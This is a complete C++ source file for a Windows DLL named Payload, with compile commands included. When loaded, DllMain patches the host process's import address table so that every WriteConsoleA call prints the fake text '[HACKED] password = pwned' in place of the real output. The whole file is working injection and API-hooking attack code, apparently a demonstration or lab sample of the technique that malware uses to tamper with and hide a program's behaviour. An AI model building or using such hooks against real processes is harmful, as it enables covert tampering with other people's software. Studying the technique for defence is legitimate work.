// Payload.cpp
// MSVC:  cl /LD /EHsc /Fe:Payload.dll Payload.cpp
// MinGW: g++ -shared -o Payload.dll Payload.cpp

#include <windows.h>
#include <cstring>

using WriteConsoleA_t = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
static WriteConsoleA_t real_WriteConsoleA = nullptr;

static BOOL WINAPI HookedWriteConsoleA(HANDLE hOut, LPCVOID,
                                       DWORD, LPDWORD lpWritten, LPVOID reserved)
{
    const char* fake = "[HACKED] password = pwned";
    return real_WriteConsoleA(hOut, fake, (DWORD)strlen(fake), lpWritten, reserved);
}

static void PatchIat(const char* importDll, const char* funcName, void* newFunc)
{
    auto base = (BYTE*)GetModuleHandleA(nullptr);
    auto dos  = (IMAGE_DOS_HEADER*)base;
    auto nt   = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    auto  imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + rva);

    for (; imp->Name; ++imp)
    {
        if (_stricmp((const char*)(base + imp->Name), importDll) != 0) continue;

        auto orig = (IMAGE_THUNK_DATA*)(base + (imp->OriginalFirstThunk
                                                 ? imp->OriginalFirstThunk
                                                 : imp->FirstThunk));
        auto iat  = (IMAGE_THUNK_DATA*)(base + imp->FirstThunk);

        for (; orig->u1.AddressOfData; ++orig, ++iat)
        {
            if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;

            auto ibn = (IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData);
            if (strcmp((const char*)ibn->Name, funcName) != 0) continue;

            real_WriteConsoleA = (WriteConsoleA_t)iat->u1.Function;

            DWORD old;
            VirtualProtect(&iat->u1.Function, sizeof(void*), PAGE_READWRITE, &old);
            iat->u1.Function = (ULONG_PTR)newFunc;
            VirtualProtect(&iat->u1.Function, sizeof(void*), old, &old);
            return;
        }
    }
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
        PatchIat("kernel32.dll", "WriteConsoleA", (void*)HookedWriteConsoleA);
    return TRUE;
}